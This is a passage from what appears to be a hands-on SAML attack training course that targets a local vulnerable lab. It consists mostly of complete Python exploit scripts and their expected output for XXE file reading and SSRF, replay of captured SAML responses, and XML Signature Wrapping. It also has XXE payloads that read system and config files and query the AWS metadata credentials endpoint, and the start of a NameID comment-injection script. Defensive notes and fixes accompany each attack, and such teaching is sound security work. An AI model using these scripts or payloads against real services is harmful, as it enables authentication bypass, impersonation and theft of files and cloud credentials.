    exploit_xxe_file_read(target_url, "/etc/passwd")

    # SSRF
    print("\n" + "=" * 80)
    print("[*] Step 3: SSRF via XXE")
    exploit_xxe_ssrf(
        target_url,
        "http://localhost:5001/admin/internal-api"  # Internal endpoint
    )

    # Note: DoS attack commented out to avoid crashing the lab
    # print("\n" + "=" * 80)
    # print("[*] Step 4: Denial of Service (Billion Laughs)")
    # exploit_xxe_dos(target_url)

    print("\n" + "=" * 80)
    print("[+] XXE Exploitation Complete")
    print("[+] Impact: File read, SSRF, potential DoS")

if __name__ == '__main__':
    main()
```

**Verification:**

```bash
# Run the XXE exploit
python3 saml_xxe_exploit.py
```

**Expected Output:**

```
================================================================================
SAML XXE EXPLOITATION TOOLKIT
================================================================================

[*] Step 1: Detect XXE Vulnerability
[+] XXE Vulnerability Detection
[+] Target: http://localhost:5001/saml/acs-xxe
[!] VULNERABLE! Error message indicates XXE processing
[!] Found indicator: 'failed to load external entity'

================================================================================
[*] Step 2: File Reading via XXE
[+] XXE File Read Attack
[+] Target: http://localhost:5001/saml/acs-xxe
[+] File: /etc/passwd
[+] Response Status: 200
[+] Response Body:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

[+] SUCCESS! File contents may be reflected in response
[+] Check response body for file contents

================================================================================
[*] Step 3: SSRF via XXE
[+] XXE SSRF Attack
[+] Target: http://localhost:5001/saml/acs-xxe
[+] SSRF URL: http://localhost:5001/admin/internal-api
[+] Response Status: 200
[+] Response Body:
{"admin_api": "internal_only", "secrets": [...]}

================================================================================
[+] XXE Exploitation Complete
[+] Impact: File read, SSRF, potential DoS
```

**Impact Assessment:**

| Attack Type | Impact | Critical Files/URLs |
|-------------|--------|---------------------|
| **File Reading** | Read server config, keys, source code | `/etc/passwd`, `/app/config.py`, `/app/certs/idp_key.pem` |
| **SSRF** | Access internal APIs, cloud metadata | `http://169.254.169.254/latest/meta-data/`, internal admin panels |
| **DoS** | Crash application, consume resources | Billion Laughs expansion |

**Defensive Note:**

XXE vulnerabilities in SAML arise from:
- Using default XML parsers (`lxml.etree.fromstring()`, `xml.etree.ElementTree`)
- Not disabling external entity resolution
- Not using `defusedxml` library

**Prevention:**
```python
# SECURE: Use defusedxml
import defusedxml.lxml as safe_lxml

xml_bytes = base64.b64decode(saml_response)
root = safe_lxml.fromstring(xml_bytes)  # Blocks XXE automatically
```

**Key Takeaway:** XXE in SAML is critical - it enables file reading, SSRF, and DoS through a seemingly innocent authentication flow. Always use `defusedxml` when parsing SAML responses. Default XML parsers in Python are XXE-vulnerable by design.

---

### 1.4 SAML Replay Attack Execution

> **AUTHORIZATION REMINDER:** Replay attacks reuse legitimate authentication assertions. Only test on systems you own.

**Target Description:**

The vulnerable application exposes `POST /saml/acs-replay` which validates signatures but **does not track processed Response IDs**. This allows attackers to capture and replay valid SAML responses multiple times.

**Attack Vector:**

Replay attacks work when:
1. Attacker intercepts a legitimate SAML response (network sniffing, browser history, logs)
2. The response is still within its validity window (`NotOnOrAfter`)
3. The SP doesn't track which Response IDs have been processed
4. Attacker resubmits the same response â†’ gains authentication as the legitimate user

**Exploit Script: SAML Replay Attack**

```python
#!/usr/bin/env python3
"""
saml_replay_attack.py - Capture and replay SAML responses

Demonstrates replay attacks when SP doesn't track processed assertions.
"""

import base64
import requests
import time
from datetime import datetime

def capture_saml_response(capture_url="http://localhost:5001/generate"):
    """
    Capture a legitimate SAML response.

    In real attacks, this would be from:
    - Network traffic interception (MitM)
    - Browser history/cache
    - Server logs
    - XSS to exfiltrate SAMLResponse parameter

    Args:
        capture_url: URL that generates test SAML responses

    Returns:
        Base64-encoded SAML response
    """
    print(f"[+] Capturing SAML response from: {capture_url}")

    response = requests.get(capture_url)
    saml_response_b64 = response.text.strip()

    print(f"[+] Captured SAML response ({len(saml_response_b64)} bytes)")

    # Decode to inspect
    xml_bytes = base64.b64decode(saml_response_b64)
    print(f"[+] Response XML length: {len(xml_bytes)} bytes")

    # Extract and display key info
    from lxml import etree
    root = etree.fromstring(xml_bytes)

    ns = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol'
    }

    response_id = root.get('ID')
    nameid = root.find('.//saml:NameID', ns)
    conditions = root.find('.//saml:Conditions', ns)

    print(f"[+] Response ID: {response_id}")
    print(f"[+] User (NameID): {nameid.text if nameid is not None else 'N/A'}")

    if conditions is not None:
        not_on_or_after = conditions.get('NotOnOrAfter')
        print(f"[+] Valid until: {not_on_or_after}")

    return saml_response_b64

def replay_saml_response(
    saml_response_b64,
    target_url="http://localhost:5001/saml/acs-replay",
    relay_state="/"
):
    """
    Replay captured SAML response to vulnerable ACS.

    Args:
        saml_response_b64: Captured response
        target_url: Vulnerable ACS endpoint
        relay_state: Post-auth redirect

    Returns:
        requests.Response object
    """
    print(f"\n[+] Replaying SAML response to: {target_url}")

    response = requests.post(
        target_url,
        data={
            'SAMLResponse': saml_response_b64,
            'RelayState': relay_state
        },
        allow_redirects=False
    )

    return response

def main():
    print("=" * 80)
    print("SAML REPLAY ATTACK")
    print("=" * 80)

    # Step 1: Capture legitimate SAML response
    print("\n[*] Step 1: Capture Legitimate SAML Response")
    saml_response = capture_saml_response()

    # Step 2: First submission (legitimate)
    print("\n" + "=" * 80)
    print("[*] Step 2: Submit Response (First Time - Legitimate)")
    response1 = replay_saml_response(saml_response)

    print(f"[+] Response Status: {response1.status_code}")
    print(f"[+] Headers: {dict(response1.headers)}")

    if response1.status_code in [302, 303]:
        print(f"[+] SUCCESS! Authenticated, redirected to: {response1.headers.get('Location')}")
        session_cookie = response1.headers.get('Set-Cookie')
        if session_cookie:
            print(f"[+] Session established: {session_cookie[:50]}...")

    # Step 3: Replay attack (resubmit same response)
    print("\n" + "=" * 80)
    print("[*] Step 3: Replay Attack (Same Response, Second Time)")
    print("[!] If vulnerable, this should succeed even though response was already used")

    time.sleep(1)  # Brief delay to simulate attacker timing

    response2 = replay_saml_response(saml_response)

    print(f"[+] Response Status: {response2.status_code}")

    if response2.status_code in [302, 303]:
        print(f"[!] VULNERABLE! Replay succeeded - same response accepted twice")
        print(f"[!] Attacker can reuse captured responses within validity window")
        print(f"[!] Impact: Session hijacking, unauthorized access")
    elif response2.status_code == 403:
        print(f"[+] SECURE! Replay rejected - SP tracks processed responses")
    else:
        print(f"[?] Unexpected response: {response2.status_code}")
        print(f"    Response: {response2.text[:200]}")

    # Step 4: Multiple replays
    print("\n" + "=" * 80)
    print("[*] Step 4: Multiple Replay Attempts")

    success_count = 0
    for i in range(3, 6):
        print(f"\n[+] Replay attempt #{i}")
        response = replay_saml_response(saml_response)

        if response.status_code in [302, 303]:
            success_count += 1
            print(f"    [!] Success - replay #{i} accepted")
        else:
            print(f"    [+] Rejected with status {response.status_code}")

    print(f"\n[+] Total successful replays: {success_count + 1}/5")

    if success_count > 0:
        print(f"[!] CRITICAL: SP accepts replayed responses - no replay protection")

    # Step 5: Timing analysis
    print("\n" + "=" * 80)
    print("[*] Step 5: Replay Window Analysis")

    # Decode and check validity window
    xml_bytes = base64.b64decode(saml_response)
    from lxml import etree
    root = etree.fromstring(xml_bytes)
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

    conditions = root.find('.//saml:Conditions', ns)
    if conditions is not None:
        not_on_or_after = conditions.get('NotOnOrAfter')
        print(f"[+] Assertion expires: {not_on_or_after}")

        # Parse timestamp
        try:
            expiry = datetime.fromisoformat(not_on_or_after.replace('Z', '+00:00'))
            now = datetime.now(expiry.tzinfo)
            remaining_seconds = (expiry - now).total_seconds()

            print(f"[+] Remaining validity: {remaining_seconds:.0f} seconds")
            print(f"[!] Attacker has {remaining_seconds:.0f}s window to replay this response")
        except:
            pass

    print("\n" + "=" * 80)
    print("[+] Replay Attack Complete")
    print("[+] Impact: Reusable authentication - attacker can intercept and reuse responses")

if __name__ == '__main__':
    main()
```

**Verification:**

```bash
# Run the replay attack
python3 saml_replay_attack.py
```

**Expected Output:**

```
================================================================================
SAML REPLAY ATTACK
================================================================================

[*] Step 1: Capture Legitimate SAML Response
[+] Capturing SAML response from: http://localhost:5001/generate
[+] Captured SAML response (1420 bytes)
[+] Response XML length: 1065 bytes
[+] Response ID: _response_abc123
[+] User (NameID): user@example.com
[+] Valid until: 2026-02-07T10:35:00Z

================================================================================
[*] Step 2: Submit Response (First Time - Legitimate)

[+] Replaying SAML response to: http://localhost:5001/saml/acs-replay
[+] Response Status: 302
[+] Headers: {'Location': '/dashboard', 'Set-Cookie': 'session=...'}
[+] SUCCESS! Authenticated, redirected to: /dashboard
[+] Session established: session=eyJ1c2VyIjoidXNlckBleGFtcGxlLmNvbSJ9...

================================================================================
[*] Step 3: Replay Attack (Same Response, Second Time)
[!] If vulnerable, this should succeed even though response was already used

[+] Replaying SAML response to: http://localhost:5001/saml/acs-replay
[+] Response Status: 302
[!] VULNERABLE! Replay succeeded - same response accepted twice
[!] Attacker can reuse captured responses within validity window
[!] Impact: Session hijacking, unauthorized access

================================================================================
[*] Step 4: Multiple Replay Attempts

[+] Replay attempt #3
    [!] Success - replay #3 accepted

[+] Replay attempt #4
    [!] Success - replay #4 accepted

[+] Replay attempt #5
    [!] Success - replay #5 accepted

[+] Total successful replays: 4/5
[!] CRITICAL: SP accepts replayed responses - no replay protection

================================================================================
[*] Step 5: Replay Window Analysis
[+] Assertion expires: 2026-02-07T10:35:00Z
[+] Remaining validity: 287 seconds
[!] Attacker has 287s window to replay this response

================================================================================
[+] Replay Attack Complete
[+] Impact: Reusable authentication - attacker can intercept and reuse responses
```

**Impact Assessment:**

| Scenario | Attack Method | Impact |
|----------|---------------|--------|
| **Network Interception** | MitM on unencrypted network | Capture and replay responses |
| **Browser History** | Access victim's browser cache | Extract and replay old responses |
| **Log Files** | Access SP application logs | Find logged SAMLResponse parameters |
| **XSS** | Inject JS to exfiltrate SAMLResponse | Real-time capture and replay |

**Defensive Note:**

Replay protection requires:
1. **Response ID Tracking** - Store processed Response IDs in Redis/cache with TTL matching assertion validity
2. **InResponseTo Validation** - Match Response.InResponseTo to a stored AuthnRequest ID
3. **Short Validity Windows** - Limit NotOnOrAfter to 5 minutes maximum
4. **HTTPS Only** - Prevent network interception of responses

**Prevention:**
```python
# SECURE: Track processed responses
import redis

response_cache = redis.Redis()
RESPONSE_TTL = 600  # 10 minutes

response_id = auth.get_last_response_id()
cache_key = f"saml_response:{response_id}"

if response_cache.exists(cache_key):
    raise SecurityError("Response replay detected")

response_cache.setex(cache_key, RESPONSE_TTL, "processed")
```

**Key Takeaway:** SAML replay attacks are trivial when SPs don't track processed Response IDs. An attacker who captures a valid response (via network sniffing, logs, or XSS) can replay it unlimited times within the validity window. Always implement response ID tracking with Redis or similar.

---

### 1.5 Spot-the-Vulnerability Exercises

Test your offensive SAML skills by identifying attack vectors in these scenarios.

**Exercise 1: SAML Response Reconnaissance**

You intercept the following Base64-encoded SAML response:

```
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN
hbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZX
M6dGM6U0FNTDoyLjA6cHJvdG9jb2wiCiAgICAgICAgICAgICAgICB4b
Wxuczpzb==
```

What reconnaissance steps would you take? What information would you extract?

<details>
<summary>Solution (click to reveal)</summary>

**Reconnaissance Steps:**

1. **Base64 Decode:**
   ```bash
   echo "PD94bWw..." | base64 -d > response.xml
   ```

2. **Pretty Print XML:**
   ```bash
   xmllint --format response.xml
   ```

3. **Extract Key Elements:**
   - Response ID (for replay tracking)
   - Assertion ID (for XSW attacks)
   - NameID (identity to target)
   - Signature presence and what it covers
   - Destination, Audience, Recipient (cross-app attack targets)
   - NotOnOrAfter (replay window)
   - AttributeStatement (privilege escalation targets)
   - Look for XML comments (injection vectors)

4. **Identify Attack Surface:**
   - Missing signature â†’ unsigned forgery attack
   - Wide validity window â†’ extended replay opportunity
   - Missing Destination/Audience â†’ cross-application replay
   - Signature on Response but not Assertion â†’ XSW opportunity
   - Admin/privileged roles in AttributeStatement â†’ escalation target

5. **Use saml_analyzer.py** from section 1.1 for automated analysis

</details>

---

**Exercise 2: Bypassing Signature Validation**

You find a SAML ACS endpoint that appears to validate signatures. How would you test if validation can be bypassed?

<details>
<summary>Solution (click to reveal)</summary>

**Testing Methodology:**

1. **Capture Legitimate Response:**
   - Generate or intercept a valid signed SAML response
   - Decode and save the XML

2. **Test 1: Remove Signature Entirely:**
   - Delete the `<ds:Signature>` element from the Assertion
   - Re-encode and submit
   - If accepted â†’ no signature validation

3. **Test 2: Submit Unsigned Assertion:**
   - Create completely new assertion from scratch (use `saml_forge_unsigned.py`)
   - Submit with arbitrary NameID and attributes
   - If accepted â†’ no signature requirement

4. **Test 3: Modify Signed Data:**
   - Keep signature but change NameID or attributes
   - Submit modified version
   - If accepted â†’ signature not properly validated

5. **Test 4: Wrong Certificate:**
   - Generate assertion signed with attacker's certificate
   - Submit to SP
   - If accepted â†’ certificate not validated against trusted IdP cert

6. **Indicators of Bypass:**
   - Authentication succeeds without signature
   - Authentication succeeds with invalid signature
   - Authentication succeeds with untrusted certificate

**Tools:**
- `saml_forge_unsigned.py` for crafting unsigned assertions
- Manual XML editing to remove/modify signatures
- openssl for generating attacker certificates

</details>

---

**Exercise 3: Crafting XXE Payloads**

You've identified that a SAML ACS endpoint is vulnerable to XXE. Craft payloads for:
1. Reading `/app/config/database.ini`
2. SSRF to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Testing if the parser expands entities (without DoS)

<details>
<summary>Solution (click to reveal)</summary>

**Payload 1: File Reading**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY config SYSTEM "file:///app/config/database.ini">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&config;</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="data">
        <saml:AttributeValue>&config;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

**Payload 2: SSRF to AWS Metadata**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&ssrf;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Payload 3: Entity Expansion Detection (Safe)**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY test "ENTITY_EXPANDED">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&test;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Check response for "ENTITY_EXPANDED" - if present, parser expands entities.

**Exploitation Script:**

Use `saml_xxe_exploit.py` from section 1.3 with custom file paths:

```python
exploit_xxe_file_read(
    "http://localhost:5001/saml/acs-xxe",
    "/app/config/database.ini"
)
```

</details>

---

## Level 2: WALK - Advanced Exploitation

### Learning Objectives

After completing L2, learners will be able to:

1. Construct XML Signature Wrapping (XSW) attacks to bypass signature validation
2. Execute NameID comment injection attacks for identity confusion
3. Exploit Recipient, Audience, and Destination bypass for cross-application access
4. Perform session manipulation attacks post-SAML authentication
5. Chain multiple SAML vulnerabilities for maximum impact

---

### 2.1 XML Signature Wrapping (XSW) Attack Construction

> **AUTHORIZATION REMINDER:** XSW attacks exploit complex XML signature validation flaws. Only test on your own vulnerable lab environment.

**Target Description:**

The vulnerable application exposes `POST /saml/acs-xsw` which validates XML signatures but extracts identity claims from the **wrong element** in the XML tree. This creates a gap between "what is signed" and "what is processed" - the essence of XSW attacks.

**XSW Theory:**

XML Signature Wrapping exploits work because:
1. XML signatures sign a specific element (referenced by ID attribute)
2. The signature validation library finds and validates that element
3. But the application extracts claims from a **different** element
4. Attacker moves the signed element to a non-processed location
5. Attacker inserts a malicious unsigned element where the app looks

**Visual Representation:**

```
BEFORE (legitimate):
<Response>
  <Assertion ID="abc" SIGNED>
    <NameID>legit@example.com</NameID>
  </Assertion>
</Response>

Signature validates: âœ“ (signs Assertion abc)
App reads: legit@example.com âœ“

AFTER XSW (attacker modified):
<Response>
  <Assertion ID="evil">                        â† App reads THIS (first assertion)
    <NameID>attacker@evil.com</NameID>
  </Assertion>
  <Assertion ID="abc" SIGNED>                  â† Signature validates THIS
    <NameID>legit@example.com</NameID>
  </Assertion>
</Response>

Signature validates: âœ“ (still signs "abc" which exists)
App reads: attacker@evil.com âœ— (from unsigned assertion!)
```

**Exploit Script: XSW Attack Generator**

```python
#!/usr/bin/env python3
"""
saml_xsw_attack.py - XML Signature Wrapping Attack

Takes a valid signed SAML response and creates XSW variants.
"""

import base64
import requests
from lxml import etree
import uuid

NAMESPACES = {
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
    'ds': 'http://www.w3.org/2000/09/xmldsig#'
}

def generate_id():
    """Generate unique SAML ID."""
    return f"_{uuid.uuid4().hex}"

def xsw_type1_prepend_unsigned_assertion(valid_response_b64, attacker_nameid):
    """
    XSW Type 1: Prepend unsigned assertion before signed one.

    Application reads first assertion (unsigned, attacker-controlled).
    Signature validation finds and validates second assertion (signed, legitimate).

    Args:
        valid_response_b64: Base64 encoded legitimate signed SAML response
        attacker_nameid: Identity to inject

    Returns:
        Base64 encoded XSW payload
    """
    # Decode original response
    xml_bytes = base64.b64decode(valid_response_b64)
    root = etree.fromstring(xml_bytes)

    # Find the signed assertion
    signed_assertion = root.find('.//saml:Assertion', NAMESPACES)

    if signed_assertion is None:
        raise ValueError("No Assertion found in response")

    # Create malicious unsigned assertion
    evil_assertion = etree.Element(
        f"{{{NAMESPACES['saml']}}}Assertion",
        ID=generate_id(),
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z"
    )

    # Add Issuer
    evil_issuer = etree.SubElement(
        evil_assertion,
        f"{{{NAMESPACES['saml']}}}Issuer"
    )
    evil_issuer.text = "https://evil-idp.attacker.com"

    # Add Subject with attacker's NameID
    evil_subject = etree.SubElement(
        evil_assertion,
        f"{{{NAMESPACES['saml']}}}Subject"
    )

    evil_nameid = etree.SubElement(
        evil_subject,
        f"{{{NAMESPACES['saml']}}}NameID",
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
    )
    evil_nameid.text = attacker_nameid

    # Add malicious attributes (e.g., admin role)
    evil_attr_stmt = etree.SubElement(
        evil_assertion,
        f"{{{NAMESPACES['saml']}}}AttributeStatement"
    )

    evil_role_attr = etree.SubElement(
        evil_attr_stmt,
        f"{{{NAMESPACES['saml']}}}Attribute",
        Name="role"
    )

    evil_role_value = etree.SubElement(
        evil_role_attr,
        f"{{{NAMESPACES['saml']}}}AttributeValue"
    )
    evil_role_value.text = "admin"

    # INSERT evil assertion BEFORE signed assertion
    # This way application's `.find('.//saml:Assertion')` finds the evil one first
    signed_assertion_index = list(root).index(signed_assertion)
    root.insert(signed_assertion_index, evil_assertion)

    # Re-encode
    xsw_xml = etree.tostring(root, encoding='utf-8', xml_declaration=True)
    xsw_b64 = base64.b64encode(xsw_xml).decode('ascii')

    return xsw_b64

def xsw_type2_wrap_signed_assertion(valid_response_b64, attacker_nameid):
    """
    XSW Type 2: Wrap signed assertion inside a new parent element.

    Creates structure where signed assertion is nested deeply,
    but a malicious assertion is at the normal location.

    Args:
        valid_response_b64: Base64 encoded legitimate signed SAML response
        attacker_nameid: Identity to inject

    Returns:
        Base64 encoded XSW payload
    """
    xml_bytes = base64.b64decode(valid_response_b64)
    root = etree.fromstring(xml_bytes)

    signed_assertion = root.find('.//saml:Assertion', NAMESPACES)

    if signed_assertion is None:
        raise ValueError("No Assertion found")

    # Remove signed assertion from its current location
    signed_assertion.getparent().remove(signed_assertion)

    # Create wrapper element to hide signed assertion
    wrapper = etree.Element(
        f"{{{NAMESPACES['saml']}}}Object"  # Arbitrary wrapper
    )
    wrapper.append(signed_assertion)

    # Create evil assertion at normal location
    evil_assertion = etree.Element(
        f"{{{NAMESPACES['saml']}}}Assertion",
        ID=generate_id(),
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z"
    )

    evil_issuer = etree.SubElement(evil_assertion, f"{{{NAMESPACES['saml']}}}Issuer")
    evil_issuer.text = "https://evil-idp.attacker.com"

    evil_subject = etree.SubElement(evil_assertion, f"{{{NAMESPACES['saml']}}}Subject")
    evil_nameid = etree.SubElement(
        evil_subject,
        f"{{{NAMESPACES['saml']}}}NameID",
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
    )
    evil_nameid.text = attacker_nameid

    evil_attr_stmt = etree.SubElement(
        evil_assertion,
        f"{{{NAMESPACES['saml']}}}AttributeStatement"
    )
    evil_role = etree.SubElement(evil_attr_stmt, f"{{{NAMESPACES['saml']}}}Attribute", Name="role")
    evil_role_val = etree.SubElement(evil_role, f"{{{NAMESPACES['saml']}}}AttributeValue")
    evil_role_val.text = "admin"

    # Add evil assertion to Response
    root.append(evil_assertion)

    # Add wrapper with signed assertion (hidden)
    root.append(wrapper)

    xsw_xml = etree.tostring(root, encoding='utf-8', xml_declaration=True)
    xsw_b64 = base64.b64encode(xsw_xml).decode('ascii')

    return xsw_b64

def display_xsw_structure(xsw_payload_b64, title):
    """Display XSW payload structure for analysis."""
    print(f"\n{'=' * 80}")
    print(f"{title}")
    print("=" * 80)

    xml_bytes = base64.b64decode(xsw_payload_b64)
    root = etree.fromstring(xml_bytes)

    # Find all assertions
    assertions = root.findall('.//saml:Assertion', NAMESPACES)

    print(f"[+] Total Assertions Found: {len(assertions)}")

    for idx, assertion in enumerate(assertions, 1):
        assertion_id = assertion.get('ID')
        has_signature = assertion.find('.//ds:Signature', NAMESPACES) is not None
        nameid_elem = assertion.find('.//saml:NameID', NAMESPACES)
        nameid = nameid_elem.text if nameid_elem is not None else 'N/A'

        print(f"\n[+] Assertion #{idx}:")
        print(f"    ID: {assertion_id}")
        print(f"    Signed: {'YES âœ“' if has_signature else 'NO (malicious)'}")
        print(f"    NameID: {nameid}")

        # Check attributes
        attrs = assertion.findall('.//saml:Attribute', NAMESPACES)
        if attrs:
            print(f"    Attributes:")
            for attr in attrs:
                attr_name = attr.get('Name')
                attr_vals = [v.text for v in attr.findall('.//saml:AttributeValue', NAMESPACES)]
                print(f"      {attr_name}: {', '.join(attr_vals)}")

    print(f"\n[!] Attack Logic:")
    print(f"    - Signature validation finds signed assertion â†’ validates âœ“")
    print(f"    - Application reads FIRST assertion â†’ uses malicious data âœ—")

def exploit_xsw(target_url, xsw_payload_b64, attack_name):
    """Submit XSW payload to vulnerable endpoint."""
    print(f"\n[+] Submitting {attack_name} to: {target_url}")

    response = requests.post(
        target_url,
        data={'SAMLResponse': xsw_payload_b64},
        allow_redirects=False
    )

    print(f"[+] Response Status: {response.status_code}")

    if response.status_code in [302, 303]:
        print(f"[!] SUCCESS! XSW attack bypassed signature validation")
        print(f"[!] Redirected to: {response.headers.get('Location')}")
        print(f"[!] Authenticated as attacker-controlled identity")
        return True
    elif response.status_code == 403:
        print(f"[+] BLOCKED - Endpoint may be validating correctly")
        return False
    else:
        print(f"[?] Unexpected response: {response.text[:200]}")
        return False

def main():
    print("=" * 80)
    print("XML SIGNATURE WRAPPING (XSW) ATTACK TOOLKIT")
    print("=" * 80)

    # Step 1: Obtain valid signed response
    print("\n[*] Step 1: Obtain Valid Signed SAML Response")
    print("[+] Fetching from test endpoint...")

    valid_response = requests.get("http://localhost:5001/generate").text.strip()
    print(f"[+] Captured signed response ({len(valid_response)} bytes)")

    # Step 2: Generate XSW Type 1 payload
    print("\n[*] Step 2: Generate XSW Type 1 (Prepend Unsigned Assertion)")

    xsw1_payload = xsw_type1_prepend_unsigned_assertion(
        valid_response,
        attacker_nameid="attacker@evil.com"
    )

    display_xsw_structure(xsw1_payload, "XSW TYPE 1 PAYLOAD STRUCTURE")

    # Step 3: Exploit XSW Type 1
    exploit_xsw(
        "http://localhost:5001/saml/acs-xsw",
        xsw1_payload,
        "XSW Type 1"
    )

    # Step 4: Generate XSW Type 2 payload
    print("\n[*] Step 4: Generate XSW Type 2 (Wrap Signed Assertion)")

    xsw2_payload = xsw_type2_wrap_signed_assertion(
        valid_response,
        attacker_nameid="admin@evil.com"
    )

    display_xsw_structure(xsw2_payload, "XSW TYPE 2 PAYLOAD STRUCTURE")

    # Step 5: Exploit XSW Type 2
    exploit_xsw(
        "http://localhost:5001/saml/acs-xsw",
        xsw2_payload,
        "XSW Type 2"
    )

    print("\n" + "=" * 80)
    print("[+] XSW Attack Complete")
    print("[+] Impact: Signature validation bypassed via XML structure manipulation")
    print("[+] Attacker authenticated with arbitrary identity despite valid signatures")

if __name__ == '__main__':
    main()
```

**Verification:**

```bash
# Run XSW attacks
python3 saml_xsw_attack.py
```

**Expected Output:**

```
================================================================================
XML SIGNATURE WRAPPING (XSW) ATTACK TOOLKIT
================================================================================

[*] Step 1: Obtain Valid Signed SAML Response
[+] Fetching from test endpoint...
[+] Captured signed response (1420 bytes)

[*] Step 2: Generate XSW Type 1 (Prepend Unsigned Assertion)

================================================================================
XSW TYPE 1 PAYLOAD STRUCTURE
================================================================================
[+] Total Assertions Found: 2

[+] Assertion #1:
    ID: _evil_abc123
    Signed: NO (malicious)
    NameID: attacker@evil.com
    Attributes:
      role: admin

[+] Assertion #2:
    ID: _legit_xyz789
    Signed: YES âœ“
    NameID: user@example.com
    Attributes:
      role: user

[!] Attack Logic:
    - Signature validation finds signed assertion â†’ validates âœ“
    - Application reads FIRST assertion â†’ uses malicious data âœ—

[+] Submitting XSW Type 1 to: http://localhost:5001/saml/acs-xsw
[+] Response Status: 302
[!] SUCCESS! XSW attack bypassed signature validation
[!] Redirected to: /dashboard
[!] Authenticated as attacker-controlled identity

[*] Step 4: Generate XSW Type 2 (Wrap Signed Assertion)
...
```

**XSW Variants Reference:**

| Type | Technique | Success Condition |
|------|-----------|-------------------|
| **XSW1** | Prepend unsigned assertion | App reads first `.find()` result |
| **XSW2** | Wrap signed in hidden element | App doesn't search nested elements |
| **XSW3** | Clone and modify assertion | App processes copy, not signed original |
| **XSW4** | Nested response wrapping | Response inside Response |
| **XSW5-8** | Combined techniques | Various positioning tricks |

**Defensive Note:**

XSW prevention requires:
1. **Extract from verified element only** - Use `signxml`'s `verified_xml` output
2. **Strict mode in python3-saml** - `strict: True` enables XSW protections
3. **Single assertion enforcement** - Reject responses with multiple assertions
4. **Schema validation** - Validate XML structure against SAML schema

**Prevention:**
```python
# SECURE: Extract from verified element
from signxml import XMLVerifier

result = XMLVerifier().verify(root, x509_cert=idp_cert)
verified_xml = result.signed_xml  # This is what was signed

# Extract claims ONLY from verified_xml, not from root
nameid = verified_xml.find('.//saml:NameID', NAMESPACES)
```

**Key Takeaway:** XSW attacks exploit the gap between "what is signed" and "what is read." Even with valid signatures, attackers can inject unsigned assertions if the application doesn't extract claims from the verified element. This is why python3-saml with `strict: True` is critical - it closes this gap.

---

### 2.2 NameID Comment Injection

> **AUTHORIZATION REMINDER:** Comment injection exploits parser differences. Only test on authorized systems.

**Target Description:**

The vulnerable application exposes `POST /saml/acs-comment` which extracts NameID using `.text` (reads only the first text node before any XML comment). This creates identity confusion when comments are embedded in the NameID value.

**Attack Theory:**

XML parsers handle comments differently:
- **`.text` property** - Returns only the first text node (before any child element/comment)
- **`itertext()` method** - Concatenates all text nodes, including after comments
- **IdP validation** - May see full text including after comment
- **SP extraction** - May see only text before comment

**Attack Vector:**

```xml
<!-- IdP sees and validates -->
<saml:NameID>attacker@evil.com<!--comment-->.legit.com</saml:NameID>

IdP validates: "attacker@evil.com.legit.com" (legitimate user)
SP reads with .text: "attacker@evil.com" (attacker domain!)
```

**Exploit Script: Comment Injection Attack**

```python
#!/usr/bin/env python3
"""
saml_comment_injection.py - NameID Comment Injection

Exploits XML comment parsing differences to forge identities.
"""

import base64
import requests
from lxml import etree
import uuid

NAMESPACES = {
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'
}

def create_comment_injection_payload(
    prefix_identity,
    suffix_identity,
    target_url="http://localhost:5001/saml/acs-comment"
):
    """
    Create SAML response with comment-injected NameID.

    Args:
        prefix_identity: Identity before comment (what SP reads)
        suffix_identity: Identity after comment (completes valid email)
        target_url: Vulnerable ACS endpoint

    Returns:
        Base64 encoded SAML response
    """
    response = etree.Element(
        f"{{{NAMESPACES['samlp']}}}Response",
        nsmap={'samlp': NAMESPACES['samlp'], 'saml': NAMESPACES['saml']},
        ID=f"_{uuid.uuid4().hex}",
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z",
        Destination=target_url
    )

    issuer = etree.SubElement(response, f"{{{NAMESPACES['saml']}}}Issuer")
    issuer.text = "https://idp.example.com"

    status = etree.SubElement(response, f"{{{NAMESPACES['samlp']}}}Status")
    status_code = etree.SubElement(
        status,
        f"{{{NAMESPACES['samlp']}}}StatusCode",
        Value="urn:oasis:names:tc:SAML:2.0:status:Success"
    )

    assertion = etree.SubElement(
        response,
